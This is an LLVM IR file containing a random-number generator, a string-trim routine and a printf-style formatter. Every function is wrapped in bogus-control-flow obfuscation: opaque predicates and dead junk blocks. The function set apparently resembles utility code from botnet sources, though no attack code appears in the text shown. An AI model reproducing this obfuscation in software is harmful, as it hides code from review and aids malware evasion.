@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0
@x.83 = common global i32 0
@y.84 = common global i32 0
@x.85 = common global i32 0
@y.86 = common global i32 0
@x.87 = common global i32 0
@y.88 = common global i32 0
@x.89 = common global i32 0
@y.90 = common global i32 0
@x.91 = common global i32 0
@y.92 = common global i32 0
@x.93 = common global i32 0
@y.94 = common global i32 0
@x.95 = common global i32 0
@y.96 = common global i32 0
@x.97 = common global i32 0
@y.98 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = load i32, i32* @x
  %3 = load i32, i32* @y
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  %12 = load i32, i32* %10, align 4
  store i32 %12, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %13 = load i32, i32* %10, align 4
  %14 = add i32 %13, -1640531527
  store i32 %14, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %15 = load i32, i32* %10, align 4
  %16 = add i32 %15, -1640531527
  %17 = add i32 %16, -1640531527
  store i32 %17, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %11, align 4
  %18 = load i32, i32* @x
  %19 = load i32, i32* @y
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart272, %originalBBpart2
  %27 = load i32, i32* %11, align 4
  %28 = icmp slt i32 %27, 4096
  br i1 %28, label %29, label %82

; <label>:29:                                     ; preds = %26
  %30 = load i32, i32* @x
  %31 = load i32, i32* @y
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %29
  %38 = load i32, i32* %11, align 4
  %39 = sub nsw i32 %38, 3
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %40
  %42 = load i32, i32* %41, align 4
  %43 = load i32, i32* %11, align 4
  %44 = sub nsw i32 %43, 2
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %45
  %47 = load i32, i32* %46, align 4
  %48 = xor i32 %42, %47
  %49 = xor i32 %48, -1640531527
  %50 = load i32, i32* %11, align 4
  %51 = xor i32 %49, %50
  %52 = load i32, i32* %11, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %53
  store i32 %51, i32* %54, align 4
  %55 = load i32, i32* @x
  %56 = load i32, i32* @y
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart265, label %originalBB29alteredBB

originalBBpart265:                                ; preds = %originalBB29
  br label %63

; <label>:63:                                     ; preds = %originalBBpart265
  %64 = load i32, i32* @x
  %65 = load i32, i32* @y
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %63
  %72 = load i32, i32* %11, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %11, align 4
  %74 = load i32, i32* @x
  %75 = load i32, i32* @y
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart272, label %originalBB67alteredBB

originalBBpart272:                                ; preds = %originalBB67
  br label %26

; <label>:82:                                     ; preds = %26
  %83 = load i32, i32* @x
  %84 = load i32, i32* @y
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %82
  %91 = load i32, i32* @x
  %92 = load i32, i32* @y
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %99 = alloca i32, align 4
  %100 = alloca i32, align 4
  store i32 %0, i32* %99, align 4
  %101 = load i32, i32* %99, align 4
  store i32 %101, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %102 = load i32, i32* %99, align 4
  %_ = sub i32 0, %102
  %gen = add i32 %_, -1640531527
  %_1 = sub i32 0, %102
  %gen2 = add i32 %_1, -1640531527
  %_3 = shl i32 %102, -1640531527
  %_4 = sub i32 %102, -1640531527
  %gen5 = mul i32 %_4, -1640531527
  %103 = add i32 %102, -1640531527
  store i32 %103, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %104 = load i32, i32* %99, align 4
  %_6 = shl i32 %104, -1640531527
  %_7 = sub i32 0, %104
  %gen8 = add i32 %_7, -1640531527
  %_9 = sub i32 %104, -1640531527
  %gen10 = mul i32 %_9, -1640531527
  %_11 = sub i32 %104, -1640531527
  %gen12 = mul i32 %_11, -1640531527
  %_13 = sub i32 0, %104
  %gen14 = add i32 %_13, -1640531527
  %_15 = shl i32 %104, -1640531527
  %_16 = sub i32 0, %104
  %gen17 = add i32 %_16, -1640531527
  %105 = add i32 %104, -1640531527
  %_18 = sub i32 0, %105
  %gen19 = add i32 %_18, -1640531527
  %_20 = sub i32 %105, -1640531527
  %gen21 = mul i32 %_20, -1640531527
  %_22 = sub i32 %105, -1640531527
  %gen23 = mul i32 %_22, -1640531527
  %_24 = sub i32 %105, -1640531527
  %gen25 = mul i32 %_24, -1640531527
  %_26 = shl i32 %105, -1640531527
  %_27 = sub i32 %105, -1640531527
  %gen28 = mul i32 %_27, -1640531527
  %106 = add i32 %105, -1640531527
  store i32 %106, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %100, align 4
  br label %originalBB

originalBB29alteredBB:                            ; preds = %originalBB29, %29
  %107 = load i32, i32* %11, align 4
  %_30 = sub i32 0, %107
  %gen31 = add i32 %_30, 3
  %_32 = sub i32 0, %107
  %gen33 = add i32 %_32, 3
  %_34 = shl i32 %107, 3
  %_35 = sub i32 0, %107
  %gen36 = add i32 %_35, 3
  %108 = sub nsw i32 %107, 3
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %109
  %111 = load i32, i32* %110, align 4
  %112 = load i32, i32* %11, align 4
  %_37 = sub i32 %112, 2
  %gen38 = mul i32 %_37, 2
  %_39 = sub i32 %112, 2
  %gen40 = mul i32 %_39, 2
  %_41 = sub i32 %112, 2
  %gen42 = mul i32 %_41, 2
  %_43 = shl i32 %112, 2
  %_44 = sub i32 %112, 2
  %gen45 = mul i32 %_44, 2
  %_46 = sub i32 0, %112
  %gen47 = add i32 %_46, 2
  %113 = sub nsw i32 %112, 2
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %114
  %116 = load i32, i32* %115, align 4
  %_48 = sub i32 0, %111
  %gen49 = add i32 %_48, %116
  %_50 = shl i32 %111, %116
  %117 = xor i32 %111, %116
  %_51 = sub i32 %117, -1640531527
  %gen52 = mul i32 %_51, -1640531527
  %_53 = shl i32 %117, -1640531527
  %_54 = shl i32 %117, -1640531527
  %_55 = sub i32 0, %117
  %gen56 = add i32 %_55, -1640531527
  %_57 = sub i32 %117, -1640531527
  %gen58 = mul i32 %_57, -1640531527
  %118 = xor i32 %117, -1640531527
  %119 = load i32, i32* %11, align 4
  %_59 = sub i32 0, %118
  %gen60 = add i32 %_59, %119
  %_61 = shl i32 %118, %119
  %_62 = sub i32 0, %118
  %gen63 = add i32 %_62, %119
  %120 = xor i32 %118, %119
  %121 = load i32, i32* %11, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %122
  store i32 %120, i32* %123, align 4
  br label %originalBB29

originalBB67alteredBB:                            ; preds = %originalBB67, %63
  %124 = load i32, i32* %11, align 4
  %_68 = shl i32 %124, 1
  %_69 = sub i32 %124, 1
  %gen70 = mul i32 %_69, 1
  %125 = add nsw i32 %124, 1
  store i32 %125, i32* %11, align 4
  br label %originalBB67

originalBB74alteredBB:                            ; preds = %originalBB74, %82
  br label %originalBB74
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = load i32, i32* @x.1
  %2 = load i32, i32* @y.2
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i64 18782, i64* %10, align 8
  store i32 -2, i32* %12, align 4
  %13 = load i32, i32* @rand_cmwc.i, align 4
  %14 = add i32 %13, 1
  %15 = and i32 %14, 4095
  store i32 %15, i32* @rand_cmwc.i, align 4
  %16 = load i64, i64* %10, align 8
  %17 = load i32, i32* @rand_cmwc.i, align 4
  %18 = zext i32 %17 to i64
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = mul i64 %16, %21
  %23 = load i32, i32* @c, align 4
  %24 = zext i32 %23 to i64
  %25 = add i64 %22, %24
  store i64 %25, i64* %9, align 8
  %26 = load i64, i64* %9, align 8
  %27 = lshr i64 %26, 32
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* @c, align 4
  %29 = load i64, i64* %9, align 8
  %30 = load i32, i32* @c, align 4
  %31 = zext i32 %30 to i64
  %32 = add i64 %29, %31
  %33 = trunc i64 %32 to i32
  store i32 %33, i32* %11, align 4
  %34 = load i32, i32* %11, align 4
  %35 = load i32, i32* @c, align 4
  %36 = icmp ult i32 %34, %35
  %37 = load i32, i32* @x.1
  %38 = load i32, i32* @y.2
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %50

; <label>:45:                                     ; preds = %originalBBpart2
  %46 = load i32, i32* %11, align 4
  %47 = add i32 %46, 1
  store i32 %47, i32* %11, align 4
  %48 = load i32, i32* @c, align 4
  %49 = add i32 %48, 1
  store i32 %49, i32* @c, align 4
  br label %50

; <label>:50:                                     ; preds = %45, %originalBBpart2
  %51 = load i32, i32* %12, align 4
  %52 = load i32, i32* %11, align 4
  %53 = sub i32 %51, %52
  %54 = load i32, i32* @rand_cmwc.i, align 4
  %55 = zext i32 %54 to i64
  %56 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %55
  store i32 %53, i32* %56, align 4
  ret i32 %53

originalBBalteredBB:                              ; preds = %originalBB, %0
  %57 = alloca i64, align 8
  %58 = alloca i64, align 8
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  store i64 18782, i64* %58, align 8
  store i32 -2, i32* %60, align 4
  %61 = load i32, i32* @rand_cmwc.i, align 4
  %_ = sub i32 0, %61
  %gen = add i32 %_, 1
  %_1 = shl i32 %61, 1
  %_2 = sub i32 %61, 1
  %gen3 = mul i32 %_2, 1
  %_4 = sub i32 0, %61
  %gen5 = add i32 %_4, 1
  %_6 = sub i32 0, %61
  %gen7 = add i32 %_6, 1
  %_8 = sub i32 %61, 1
  %gen9 = mul i32 %_8, 1
  %_10 = sub i32 %61, 1
  %gen11 = mul i32 %_10, 1
  %62 = add i32 %61, 1
  %_12 = sub i32 %62, 4095
  %gen13 = mul i32 %_12, 4095
  %_14 = shl i32 %62, 4095
  %_15 = sub i32 0, %62
  %gen16 = add i32 %_15, 4095
  %_17 = sub i32 0, %62
  %gen18 = add i32 %_17, 4095
  %_19 = shl i32 %62, 4095
  %_20 = sub i32 0, %62
  %gen21 = add i32 %_20, 4095
  %_22 = sub i32 %62, 4095
  %gen23 = mul i32 %_22, 4095
  %_24 = sub i32 0, %62
  %gen25 = add i32 %_24, 4095
  %63 = and i32 %62, 4095
  store i32 %63, i32* @rand_cmwc.i, align 4
  %64 = load i64, i64* %58, align 8
  %65 = load i32, i32* @rand_cmwc.i, align 4
  %66 = zext i32 %65 to i64
  %67 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %66
  %68 = load i32, i32* %67, align 4
  %69 = zext i32 %68 to i64
  %_26 = sub i64 %64, %69
  %gen27 = mul i64 %_26, %69
  %_28 = sub i64 %64, %69
  %gen29 = mul i64 %_28, %69
  %_30 = shl i64 %64, %69
  %70 = mul i64 %64, %69
  %71 = load i32, i32* @c, align 4
  %72 = zext i32 %71 to i64
  %_31 = sub i64 %70, %72
  %gen32 = mul i64 %_31, %72
  %_33 = sub i64 0, %70
  %gen34 = add i64 %_33, %72
  %_35 = shl i64 %70, %72
  %_36 = sub i64 0, %70
  %gen37 = add i64 %_36, %72
  %73 = add i64 %70, %72
  store i64 %73, i64* %57, align 8
  %74 = load i64, i64* %57, align 8
  %_38 = sub i64 %74, 32
  %gen39 = mul i64 %_38, 32
  %_40 = sub i64 0, %74
  %gen41 = add i64 %_40, 32
  %_42 = sub i64 %74, 32
  %gen43 = mul i64 %_42, 32
  %_44 = shl i64 %74, 32
  %_45 = sub i64 %74, 32
  %gen46 = mul i64 %_45, 32
  %_47 = shl i64 %74, 32
  %_48 = sub i64 0, %74
  %gen49 = add i64 %_48, 32
  %75 = lshr i64 %74, 32
  %76 = trunc i64 %75 to i32
  store i32 %76, i32* @c, align 4
  %77 = load i64, i64* %57, align 8
  %78 = load i32, i32* @c, align 4
  %79 = zext i32 %78 to i64
  %_50 = shl i64 %77, %79
  %_51 = sub i64 0, %77
  %gen52 = add i64 %_51, %79
  %_53 = shl i64 %77, %79
  %_54 = sub i64 0, %77
  %gen55 = add i64 %_54, %79
  %_56 = sub i64 0, %77
  %gen57 = add i64 %_56, %79
  %80 = add i64 %77, %79
  %81 = trunc i64 %80 to i32
  store i32 %81, i32* %59, align 4
  %82 = load i32, i32* %59, align 4
  %83 = load i32, i32* @c, align 4
  %84 = icmp ult i32 %82, %83
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = load i32, i32* @x.3
  %3 = load i32, i32* @y.4
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i8* %0, i8** %10, align 8
  store i32 0, i32* %12, align 4
  %14 = load i8*, i8** %10, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = sub i64 %15, 1
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %13, align 4
  %18 = load i32, i32* @x.3
  %19 = load i32, i32* @y.4
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %35, %originalBBpart2
  %27 = load i8*, i8** %10, align 8
  %28 = load i32, i32* %12, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds i8, i8* %27, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = call i32 @isspace(i32 %32) #10
  %34 = icmp ne i32 %33, 0
  br i1 %34, label %35, label %38

; <label>:35:                                     ; preds = %26
  %36 = load i32, i32* %12, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %12, align 4
  br label %26

; <label>:38:                                     ; preds = %26
  %39 = load i32, i32* @x.3
  %40 = load i32, i32* @y.4
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %38
  %47 = load i32, i32* @x.3
  %48 = load i32, i32* @y.4
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  br label %55

; <label>:55:                                     ; preds = %originalBBpart223, %originalBBpart214
  %56 = load i32, i32* %13, align 4
  %57 = load i32, i32* %12, align 4
  %58 = icmp sge i32 %56, %57
  br i1 %58, label %59, label %84

; <label>:59:                                     ; preds = %55
  %60 = load i32, i32* @x.3
  %61 = load i32, i32* @y.4
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %59
  %68 = load i8*, i8** %10, align 8
  %69 = load i32, i32* %13, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %68, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = call i32 @isspace(i32 %73) #10
  %75 = icmp ne i32 %74, 0
  %76 = load i32, i32* @x.3
  %77 = load i32, i32* @y.4
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br label %84

; <label>:84:                                     ; preds = %originalBBpart218, %55
  %85 = phi i1 [ false, %55 ], [ %75, %originalBBpart218 ]
  br i1 %85, label %86, label %105

; <label>:86:                                     ; preds = %84
  %87 = load i32, i32* @x.3
  %88 = load i32, i32* @y.4
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %86
  %95 = load i32, i32* %13, align 4
  %96 = add nsw i32 %95, -1
  store i32 %96, i32* %13, align 4
  %97 = load i32, i32* @x.3
  %98 = load i32, i32* @y.4
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart223, label %originalBB20alteredBB

originalBBpart223:                                ; preds = %originalBB20
  br label %55

; <label>:105:                                    ; preds = %84
  %106 = load i32, i32* @x.3
  %107 = load i32, i32* @y.4
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %105
  %114 = load i32, i32* %12, align 4
  store i32 %114, i32* %11, align 4
  %115 = load i32, i32* @x.3
  %116 = load i32, i32* @y.4
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %123

; <label>:123:                                    ; preds = %139, %originalBBpart227
  %124 = load i32, i32* %11, align 4
  %125 = load i32, i32* %13, align 4
  %126 = icmp sle i32 %124, %125
  br i1 %126, label %127, label %142

; <label>:127:                                    ; preds = %123
  %128 = load i8*, i8** %10, align 8
  %129 = load i32, i32* %11, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8, i8* %128, i64 %130
  %132 = load i8, i8* %131, align 1
  %133 = load i8*, i8** %10, align 8
  %134 = load i32, i32* %11, align 4
  %135 = load i32, i32* %12, align 4
  %136 = sub nsw i32 %134, %135
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i8, i8* %133, i64 %137
  store i8 %132, i8* %138, align 1
  br label %139

; <label>:139:                                    ; preds = %127
  %140 = load i32, i32* %11, align 4
  %141 = add nsw i32 %140, 1
  store i32 %141, i32* %11, align 4
  br label %123

; <label>:142:                                    ; preds = %123
  %143 = load i8*, i8** %10, align 8
  %144 = load i32, i32* %11, align 4
  %145 = load i32, i32* %12, align 4
  %146 = sub nsw i32 %144, %145
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds i8, i8* %143, i64 %147
  store i8 0, i8* %148, align 1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %149 = alloca i8*, align 8
  %150 = alloca i32, align 4
  %151 = alloca i32, align 4
  %152 = alloca i32, align 4
  store i8* %0, i8** %149, align 8
  store i32 0, i32* %151, align 4
  %153 = load i8*, i8** %149, align 8
  %154 = call i64 @strlen(i8* %153) #10
  %_ = sub i64 %154, 1
  %gen = mul i64 %_, 1
  %_1 = shl i64 %154, 1
  %_2 = sub i64 0, %154
  %gen3 = add i64 %_2, 1
  %_4 = sub i64 %154, 1
  %gen5 = mul i64 %_4, 1
  %_6 = shl i64 %154, 1
  %_7 = sub i64 0, %154
  %gen8 = add i64 %_7, 1
  %_9 = sub i64 %154, 1
  %gen10 = mul i64 %_9, 1
  %_11 = shl i64 %154, 1
  %155 = sub i64 %154, 1
  %156 = trunc i64 %155 to i32
  store i32 %156, i32* %152, align 4
  br label %originalBB

originalBB12alteredBB:                            ; preds = %originalBB12, %38
  br label %originalBB12

originalBB16alteredBB:                            ; preds = %originalBB16, %59
  %157 = load i8*, i8** %10, align 8
  %158 = load i32, i32* %13, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds i8, i8* %157, i64 %159
  %161 = load i8, i8* %160, align 1
  %162 = sext i8 %161 to i32
  %163 = call i32 @isspace(i32 %162) #10
  %164 = icmp ne i32 %163, 0
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %86
  %165 = load i32, i32* %13, align 4
  %_21 = shl i32 %165, -1
  %166 = add nsw i32 %165, -1
  store i32 %166, i32* %13, align 4
  br label %originalBB20

originalBB25alteredBB:                            ; preds = %originalBB25, %105
  %167 = load i32, i32* %12, align 4
  store i32 %167, i32* %11, align 4
  br label %originalBB25
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %571, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %574

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %546

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %46

; <label>:29:                                     ; preds = %22
  %30 = load i32, i32* @x.7
  %31 = load i32, i32* @y.8
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %29
  %38 = load i32, i32* @x.7
  %39 = load i32, i32* @y.8
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %574

; <label>:46:                                     ; preds = %22
  %47 = load i32, i32* @x.7
  %48 = load i32, i32* @y.8
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %46
  %55 = load i8*, i8** %5, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = icmp eq i32 %57, 37
  %59 = load i32, i32* @x.7
  %60 = load i32, i32* @y.8
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %58, label %67, label %68

; <label>:67:                                     ; preds = %originalBBpart24
  br label %547

; <label>:68:                                     ; preds = %originalBBpart24
  %69 = load i8*, i8** %5, align 8
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp eq i32 %71, 45
  br i1 %72, label %73, label %92

